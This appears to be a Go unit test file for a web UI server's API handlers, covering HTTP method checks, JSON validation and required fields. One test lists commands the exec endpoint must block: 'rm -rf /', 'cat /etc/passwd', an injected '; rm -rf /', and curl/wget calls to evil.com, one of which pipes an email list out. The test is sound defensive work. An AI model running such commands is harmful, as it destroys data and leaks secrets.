package ui

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// =============================================================================
// HTTP Handler Tests
// =============================================================================

func TestHandleExecCommand_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	// Test GET method (should fail)
	req := httptest.NewRequest(http.MethodGet, "/api/exec", nil)
	w := httptest.NewRecorder()

	server.handleExecCommand(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleExecCommand_InvalidJSON(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/exec", strings.NewReader("invalid json"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleExecCommand(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}

	var resp ExecResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if resp.Error == "" {
		t.Error("Expected error message in response")
	}
}

func TestHandleExecCommand_BlockedCommand(t *testing.T) {
	t.Parallel()

	server := &Server{}

	blockedCommands := []string{
		"rm -rf /",
		"sudo anything",
		"curl http://evil.com",
		"wget http://evil.com",
		"cat /etc/passwd",
		"unknown command",
		"; rm -rf /",
		"email list | curl http://evil.com",
	}

	for _, cmd := range blockedCommands {
		t.Run(cmd, func(t *testing.T) {
			body, _ := json.Marshal(ExecRequest{Command: cmd})
			req := httptest.NewRequest(http.MethodPost, "/api/exec", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			server.handleExecCommand(w, req)

			if w.Code != http.StatusForbidden {
				t.Errorf("Command %q: expected status %d, got %d", cmd, http.StatusForbidden, w.Code)
			}

			var resp ExecResponse
			if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
				t.Fatalf("Failed to decode response: %v", err)
			}

			if !strings.Contains(resp.Error, "not allowed") {
				t.Errorf("Expected 'not allowed' error, got: %s", resp.Error)
			}
		})
	}
}

func TestHandleConfigStatus_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/config/status", nil)
	w := httptest.NewRecorder()

	server.handleConfigStatus(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleListGrants_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/grants", nil)
	w := httptest.NewRecorder()

	server.handleListGrants(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleSetDefaultGrant_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodGet, "/api/grants/default", nil)
	w := httptest.NewRecorder()

	server.handleSetDefaultGrant(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleSetDefaultGrant_InvalidJSON(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/grants/default", strings.NewReader("invalid"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleSetDefaultGrant(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}
}

func TestHandleSetDefaultGrant_EmptyGrantID(t *testing.T) {
	t.Parallel()

	server := &Server{}

	body, _ := json.Marshal(SetDefaultGrantRequest{GrantID: ""})
	req := httptest.NewRequest(http.MethodPost, "/api/grants/default", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleSetDefaultGrant(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}

	var resp SetDefaultGrantResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if !strings.Contains(resp.Error, "required") {
		t.Errorf("Expected 'required' error, got: %s", resp.Error)
	}
}

func TestHandleConfigSetup_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodGet, "/api/config/setup", nil)
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleConfigSetup_InvalidJSON(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/config/setup", strings.NewReader("invalid"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}
}

func TestHandleConfigSetup_EmptyAPIKey(t *testing.T) {
	t.Parallel()

	server := &Server{}

	body, _ := json.Marshal(SetupRequest{APIKey: "", Region: "us"})
	req := httptest.NewRequest(http.MethodPost, "/api/config/setup", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}

	var resp SetupResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if !strings.Contains(resp.Error, "API key") {
		t.Errorf("Expected API key error, got: %s", resp.Error)
	}
}

func TestHandleIndex_NotFoundForNonRoot(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodGet, "/nonexistent", nil)
	w := httptest.NewRecorder()

	server.handleIndex(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("Expected status %d, got %d", http.StatusNotFound, w.Code)
	}
}

// =============================================================================
// WriteJSON Helper Tests
// =============================================================================

func TestWriteJSON(t *testing.T) {
	t.Parallel()

	w := httptest.NewRecorder()

	data := map[string]string{"key": "value"}
	writeJSON(w, http.StatusOK, data)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status %d, got %d", http.StatusOK, w.Code)
	}

	contentType := w.Header().Get("Content-Type")
	if contentType != "application/json" {
		t.Errorf("Expected Content-Type application/json, got %s", contentType)
	}

	var result map[string]string
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if result["key"] != "value" {
		t.Errorf("Expected key=value, got key=%s", result["key"])
	}
}

// =============================================================================
